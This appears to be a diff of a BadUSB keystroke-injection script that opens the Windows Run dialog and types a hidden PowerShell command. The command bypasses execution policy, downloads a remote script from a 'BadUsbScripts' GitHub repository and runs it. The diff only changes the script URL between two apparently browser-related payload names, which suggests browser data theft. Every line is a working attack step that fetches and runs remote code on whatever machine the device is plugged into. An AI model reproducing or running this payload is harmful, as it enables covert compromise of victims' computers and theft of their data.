@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='';irm https://raw.githubusercontent.com/dldygnl/BadUsbScripts/refs/heads/main/browser/browser-data.ps1 | iex
+STRING powershell -w h -ep bypass $dc='';irm https://raw.githubusercontent.com/dldygnl/BadUsbScripts/refs/heads/main/browser/brow.ps1 | iex
 ENTER
